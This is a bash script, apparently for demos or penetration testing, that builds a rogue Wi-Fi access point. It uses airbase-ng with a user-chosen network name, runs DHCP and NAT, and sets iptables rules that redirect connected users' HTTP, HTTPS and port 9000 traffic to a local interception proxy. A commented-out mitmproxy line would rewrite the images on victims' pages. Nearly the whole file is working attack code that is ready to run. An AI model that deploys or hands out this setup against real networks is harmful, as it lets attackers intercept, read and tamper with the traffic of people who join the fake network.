#!/bin/bash

######################################################################################
######################################################################################

# Authors: Alex Walker, Luuk Derksen

# INSTRUCTIONS:
# call the scripts and pass it the gateway address, this machines internet access:
# e.g ./start_accesspoint.sh 192.168.1.1 eth0 "F4ke access point"

######################################################################################
######################################################################################

#check for root/sudo
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

# if [ $# -ne 3 ]; then #check that two arguments have been passed - the second is the image to display
#         echo "You need three arguments - route IP, internet interface, access point name"
#         exit 1
# fi

# SETUP
read -p "what is the gateway? (route -n)" -e GATEWAY
echo "the gateway is $GATEWAY"
read -p "What interface provides wifi?" -e DEV_INET
echo "the interface set is $DEV_INET"
read -p "What do you want to call the access point?" -e AP_NAME
echo "the access point is set as $AP_NAME"


AP_MAC=""
DEV_WLAN="wlan1"
DEV_MON="wlan1mon"
DEV_AP="at0"


# Command to disable rfblocking.
rfkill unblock wifi


echo "Starting WLAN in Monitor mode"
#craziness required in kali 2.0
airmon-ng start $DEV_WLAN
sleep 1
ifconfig $DEV_MON down
sleep 1
iwconfig $DEV_MON mode Monitor
sleep 1
ifconfig $DEV_MON up


######################################################################################
######################################################################################


# To setup an accesspoint we can use airbase-ng
echo "Starting the rogue AccessPoint"
airbase-ng --essid "$AP_NAME" -c 6 -y $DEV_MON -v &
echo "AccessPoint up and running"



# Make the accesspoint externally facing
sleep 3; 
ifconfig $DEV_AP up 192.168.99.1 netmask 255.255.255.0
sleep 2


# Start the DHCP server.
route add -net 192.168.99.0 netmask 255.255.255.0 gw 192.168.99.1
service isc-dhcp-server start > /dev/null 2>&1 
sleep 5



echo 0 > /proc/sys/net/ipv4/ip_forward

# Flush the iptables.
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
# Then reconfigure the iptables
# iptables -P FORWARD ACCEPT #--- why dont we use this?
iptables --table nat --append POSTROUTING --out-interface $DEV_INET -j MASQUERADE
iptables --append FORWARD --in-interface $DEV_AP -j ACCEPT
iptables --table nat --append PREROUTING --protocol udp --dport 53 -j DNAT --to $GATEWAY

# This is only for something that is going to redirect the connection back.

#THIS LINE IS FOR MITMPROXY/BURP
#mitmproxy -T --host --replace :~hq~s:"<img\s[^>]*?src\s*=\s*['\"]([^'\"]*?)['\"][^>]*?>":"<img src=\"http://www.thedrum.com/uploads/drum_basic_article/147818/main_images/decoded.jpg\">"


# Configure the IPTables
iptables -t nat -A PREROUTING --protocol tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING --protocol tcp --dport 443 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING --protocol tcp --dport 9000 -j REDIRECT --to-ports 8080



echo 1 > /proc/sys/net/ipv4/ip_forward


######################################################################################
######################################################################################

